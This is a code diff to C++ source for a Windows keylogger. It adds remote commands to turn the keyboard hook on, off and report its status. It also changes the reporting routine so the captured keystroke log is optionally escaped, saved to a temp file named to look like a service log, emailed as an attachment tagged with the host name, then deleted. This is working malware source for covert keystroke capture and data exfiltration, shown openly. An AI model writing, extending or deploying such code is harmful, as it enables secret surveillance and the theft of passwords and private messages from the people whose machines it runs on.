@@ -8,10 +8,11 @@
 #include "services/KeyBlockService.h"
 #include "helpers/ComputerInfoHelper.h"
 #include "helpers/Configuration.h"
+#include "helpers/DataParser/DataParser.h"
 
 Keylogger::Keylogger() {
     CommandParser::addCommand(L"email", [this](std::wstring argStr) {
-        bool result = this->sendEmailReport(argStr, false);
+        bool result = this->sendEmailReport(argStr, false, false);
         auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
         if (result) {
             return L"Report to " + receiverStr + L" successfully sent";
@@ -19,14 +20,43 @@ Keylogger::Keylogger() {
             return L"Can't send report to " + receiverStr;
         }
     });
+
+	CommandParser::addCommand(L"email_esc", [this](std::wstring argStr) {
+		bool result = this->sendEmailReport(argStr, false, true);
+		auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
+		if (result) {
+			return L"Report to " + receiverStr + L" successfully sent";
+		} else {
+			return L"Can't send report to " + receiverStr;
+		}
+	});
+
     CommandParser::addCommand(L"on", [this](std::wstring argStr) {
-        this->start();
-        return L"Logging started successfully";
+		bool isEnabled = this->hook->checkEnabled();
+		if (!isEnabled) {
+			this->hook->enable();
+			return L"Logging turned on";
+		} else {
+			return L"Logging already turned on";
+		}
     });
     CommandParser::addCommand(L"off", [this](std::wstring argStr) {
-        this->stop();
-        return L"Logging turned off";
+		bool isEnabled = this->hook->checkEnabled();
+		if (isEnabled) {
+			this->hook->disable();
+			return L"Logging turned off";
+		} else {
+			return L"Logging already turned off";
+		}
     });
+	CommandParser::addCommand(L"status", [this](std::wstring argStr) {
+		bool isEnabled = this->hook->checkEnabled();
+		if (isEnabled) {
+			return L"Keylogger is on";
+		} else {
+			return L"Keylogger is off";
+		}
+	});
     CommandParser::addCommand(L"haha", [this](std::wstring argStr) {
         this->stop();
         this->start();
@@ -153,25 +183,47 @@ void Keylogger::stop() {
     }
 }
 
-bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
+bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal, bool escaped) {
     auto emailService = make_shared<EmailService>();
 
     // Create email subject
     std::wstringstream subject;
     subject << L"Keylogger report for " << ComputerInfoHelper::getInstance()->getHostName() << L".";
 
-    // Create email body
-    const std::locale utf8_locale
-        = std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
-    logFile.close();
-    std::wifstream logData;
-    logData.imbue(utf8_locale);
-    logData.open(this->logfilePath, std::ios::in);
-    std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
-        std::istreambuf_iterator<wchar_t>());
-    logData.close();
+	bool sendEmailResult;
+	const std::locale utf8_locale
+		= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
+	logFile.close();
 
-    bool sendEmailResult = emailService->sendEmail(subject.str(), body, emailTo);
+	if (escaped) {
+		std::wifstream logData;
+		logData.imbue(utf8_locale);
+		logData.open(this->logfilePath, std::ios::in);
+		std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
+			std::istreambuf_iterator<wchar_t>());
+		logData.close();
+
+		auto dataParser = DataParser(body);
+		body = dataParser.getEscaped();
+
+		const int buffSize = 1024;
+		wchar_t buff[buffSize];
+		GetTempPath(buffSize, buff);
+		std::wstring tempFilePath = std::wstring(buff) + L"\\escaped_service_log.txt";
+
+		std::wofstream escapedLogFile;
+		escapedLogFile.imbue(utf8_locale);
+		escapedLogFile.open(tempFilePath);
+		escapedLogFile << body;
+		escapedLogFile.close();
+
+		sendEmailResult = emailService->sendEmail(subject.str(), L"", tempFilePath, emailTo);
+
+		remove(StringHelper::ws2s(tempFilePath).c_str());
+	} else {
+		sendEmailResult = emailService->sendEmail(subject.str(), L"", logfilePath, emailTo);
+	}
+
 
     if (!sendEmailResult) {
         return false;
